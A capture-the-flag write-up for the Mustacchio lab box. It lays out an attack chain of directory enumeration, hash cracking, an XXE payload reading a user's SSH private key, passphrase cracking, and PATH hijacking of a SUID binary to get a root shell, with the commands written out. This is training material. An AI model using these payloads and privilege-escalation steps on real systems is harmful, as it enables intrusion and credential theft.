**Difficulty:** Medium  
**Tags:** #XXE, #SSH, #Path_Hijacking, #SUID, #Privilege_Escalation, #WebEnum

---

***Mustacchio hides secrets behind a misconfigured XML parser and insecure backup files. With smart directory busting and crafted XML payloads, it's possible to exfiltrate sensitive SSH keys, escalate privileges via PATH hijacking, and ultimately claim root.***

---

## 🔍 Initial Enumeration

* Nmap scan revealed three open ports:
  ```bash
  22/tcp   open  ssh
  80/tcp   open  http
  8657/tcp open  unknown (custom admin panel)
  ```

* Navigated to `http://10.10.X.X/` → Basic webpage

* Ran Gobuster:
  ```bash
  gobuster dir -u http://10.10.X.X -w /usr/share/wordlists/dirb/common.txt
  ```

✅ Discovered `/custom/` directory

---

## 📂 Cracked Admin Credentials

* Found user data in exposed file:
  ```
  /custom/users.db
  ```

* Contained:
  ```
  Username: admin
  Password hash: [hashed]
  ```

* Cracked using `john` + `rockyou.txt`  
✅ Password: `bulldog19`

---

## 🔐 Admin Panel Access (Port 8657)

* Visited: `http://10.10.X.X:8657`
* Logged in with:
  - Username: `admin`
  - Password: `bulldog19`

* After login → saw a **comment box form**
* Source page revealed a backup file:
  - `dontforget.bak`

* The `.bak` file exposed XML structure:
  ```xml
  <comment>
    <name>...</name>
    <author>...</author>
    <com>...</com>
  </comment>
  ```

---

## 🪓 XXE Exploit → SSH Key Exfiltration

* Crafted XML payload:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE comment [
    <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">
  ]>
  <comment>
    <name>Aadi</name>
    <author>Barry</author>
    <com>&xxe;</com>
  </comment>
  ```

* Submitted via comment box  
✅ Dumped **Barry’s `id_rsa` private key**

---

## 🔓 Cracking Barry’s SSH Key

* Key was encrypted with passphrase

* Converted and cracked with:
  ```bash
  ssh2john id_rsa > hash.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
  ```

✅ Passphrase found  
✅ SSH as Barry:
```bash
ssh -i id_rsa barry@10.10.X.X
```

---

## 🧍 User Access (barry)

* Retrieved `user.txt` from Barry's home directory ✅

* Enumerated `/etc/passwd`  
✅ Discovered second user: `joe`

---

## 📦 Privilege Escalation → Root

### 🔎 Found SUID binary:
```bash
/home/joe/live_log
```

* SUID-root:
  ```bash
  -rwsr-xr-x 1 root root 13337 live_log
  ```

* Running binary showed:
  ```bash
  tail -f /var/log/nginx/access.log
  ```

* `tail` is **called without full path** → vulnerable to `$PATH` hijack

---

## 💣 PATH Hijack Exploit

* Created malicious fake `tail`:
  ```bash
  mkdir /tmp/faketools
  echo -e '#!/bin/bash\ncp /bin/bash /tmp/rooted\nchmod +s /tmp/rooted' > /tmp/faketools/tail
  chmod +x /tmp/faketools/tail
  ```

* Hijacked PATH and ran:
  ```bash
  export PATH=/tmp/faketools:$PATH
  /home/joe/live_log
  ```

* Executed:
  ```bash
  /tmp/rooted -p
  ```

✅ Got root shell  
✅ Retrieved `/root/root.txt`

---

## 🧠 Summary

| Step  | Description                                        |
|-------|----------------------------------------------------|
| 🔍 1  | Found 3 open ports (`22`, `80`, `8657`)            |
| 🛠️ 2 | Gobusted `/custom/`, found admin hash              |
| 🔑 3  | Cracked hash → `bulldog19`, logged into admin panel |
| 🪓 4  | XXE exploited to steal Barry’s SSH key             |
| 🧑‍💻 5 | Cracked passphrase, SSH’d into Barry              |
| 🧍‍♂️ 6 | Found SUID binary under `joe`                     |
| 💣 7 | PATH Hijack → Copied SUID bash → Got root           |

---

## 😎 Final Thoughts

* This box was 🔥 for practicing:
  - XML External Entity (XXE)
  - Directory brute-force enumeration
  - Cracking and SSH access
  - PATH Hijacking with SUID binaries

* Realistic attack chain from web exploit → user shell → root privesc.

---

## 🧼 Cleanup

```bash
rm -rf /tmp/faketools
rm /tmp/rooted
unset PATH
```

---

## 🌏 Rooted by: Aadi (aka the Mustacchio Slayer)
